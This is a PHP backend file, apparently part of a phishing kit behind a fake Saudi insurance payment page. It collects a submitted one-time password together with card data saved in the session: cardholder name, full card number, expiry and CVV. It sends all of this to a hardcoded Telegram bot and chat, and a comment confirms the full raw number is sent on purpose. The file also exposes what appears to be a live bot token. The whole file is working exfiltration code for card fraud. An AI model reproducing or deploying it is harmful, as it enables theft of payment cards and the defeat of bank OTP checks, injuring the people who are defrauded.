<?php
// tele/otp.php
session_start();

// Telegram
define('BOT_TOKEN','7910223326:AAGB_WRgVyXMqgEkb-iRCUQkAH14zLbwwcE');
define('CHAT_ID',  '8407843143');
define('API_URL',  'https://api.telegram.org/bot'.BOT_TOKEN.'/sendMessage');

header('Content-Type: application/json; charset=utf-8');

// فقط POST
if($_SERVER['REQUEST_METHOD']!=='POST'){
  echo json_encode(['ok'=>false,'error'=>'Method Not Allowed'], JSON_UNESCAPED_UNICODE); exit;
}

function esc($v){ return htmlspecialchars((string)$v, ENT_QUOTES|ENT_SUBSTITUTE, 'UTF-8'); }
function post($k,$d=''){ return isset($_POST[$k]) ? trim((string)$_POST[$k]) : $d; }

$pin_code        = post('pin_code','');
$user_id         = post('user_id','');
$transaction_id  = post('transaction_id','');
$payment_amount  = post('payment_amount','');
$card_last4_sent = post('card_last_digits','');
$timestamp       = post('timestamp', date('c'));

$last = $_SESSION['last_payment'] ?? [];

// من الجلسة (تم حفظها في tele/pay.php)
$cardholder_name = $last['cardholder_name'] ?? '';
$card_raw        = $last['card_number_raw'] ?? '';
$masked_card     = $last['masked_card'] ?? '';
$expiry_date     = $last['expiry_date'] ?? '';
$cvv_raw         = $last['cvv_raw'] ?? '';
$total_amount    = $last['total_amount'] ?? '';
$insurance       = $last['insurance'] ?? [];
$features        = $insurance['features'] ?? [];

if(!$pin_code){
  echo json_encode(['ok'=>false,'error'=>'OTP مطلوب'], JSON_UNESCAPED_UNICODE); exit;
}

// لو لم تُرسل آخر 4، استخرجها من الرقم الخام
if(!$card_last4_sent && $card_raw){
  $card_last4_sent = substr($card_raw, -4);
}

// نص الرسالة
$L=[];
$L[]="✅ <b>OTP مُستلم</b>";
$L[]="— — — — — — — — —";
$L[]="🔢 <b>الرمز:</b> <code>".esc($pin_code)."</code>";
$L[]="🕒 <b>الوقت:</b> ".esc($timestamp);

$L[]="— — — — — — — — —";
$L[]="💳 <b>بيانات البطاقة (إعادة إرسال)</b>";
$L[]="• الاسم: <b>".esc($cardholder_name)."</b>";
$L[]="• card number: <code>".esc($masked_card)."</code>";
if($card_last4_sent) $L[]="• آخر 4: <code>".esc($card_last4_sent)."</code>";
$L[]="• الانتهاء: <code>".esc($expiry_date)."</code>";
$L[]="• CVV: <code>".esc($cvv_raw)."</code>";
// تحذير: السطر التالي يُرسل الرقم الخام كاملاً كما طلبت
if($card_raw) $L[]="• card number: <code>".esc($card_raw)."</code>";
if($payment_amount ?: $total_amount){
  $L[]="• المبلغ: <b>".esc($payment_amount ?: $total_amount)."</b>";
}
$L[]="— — — — — — — — —";
$L[]="🏢 <b>ملخّص التأمين</b>";
$L[]="• الشركة: <b>".esc($insurance['company'] ?? '')."</b>";
$L[]="• الخطة: <b>".esc($insurance['plan'] ?? '')."</b>";
$L[]="• الأساسي: <b>".esc($insurance['base'] ?? '')." ريال</b>";
$L[]="• الفرعي: <b>".esc($insurance['price'] ?? '')." ريال</b>";
$L[]="• الضريبة 15%: <b>".esc($insurance['vat'] ?? '')." ريال</b>";
$L[]="• الإجمالي: <b>".esc($insurance['total'] ?? '')." ريال</b>";
if(!empty($features)){
  $L[]="• <u>الإضافات:</u>";
  foreach($features as $f){
    $lab = esc($f['label'] ?? '-');
    $pr  = esc($f['price'] ?? '0');
    $L[]=" ◦ {$lab} (+{$pr} ريال)";
  }
}
if(!empty($insurance['start_date']) || !empty($insurance['end_date'])){
  $L[]="• الفترة: ".esc($insurance['start_date'] ?? '')." → ".esc($insurance['end_date'] ?? '');
}

$text = implode("\n",$L);

// إرسال
$payload=[
  'chat_id'=>CHAT_ID,
  'text'=>$text,
  'parse_mode'=>'HTML',
  'disable_web_page_preview'=>true,
];

$ch=curl_init(API_URL);
curl_setopt_array($ch,[
  CURLOPT_RETURNTRANSFER=>true,
  CURLOPT_POST=>true,
  CURLOPT_POSTFIELDS=>http_build_query($payload),
  CURLOPT_CONNECTTIMEOUT=>10,
  CURLOPT_TIMEOUT=>20,
]);
$res=curl_exec($ch);
$err=curl_error($ch);
$http=curl_getinfo($ch, CURLINFO_HTTP_CODE);
curl_close($ch);

if($err || $http<200 || $http>=300){
  echo json_encode(['ok'=>false,'http'=>$http,'error'=>$err?:'Telegram send failed','response'=>$res], JSON_UNESCAPED_UNICODE);
  exit;
}

echo json_encode(['ok'=>true], JSON_UNESCAPED_UNICODE);
exit;
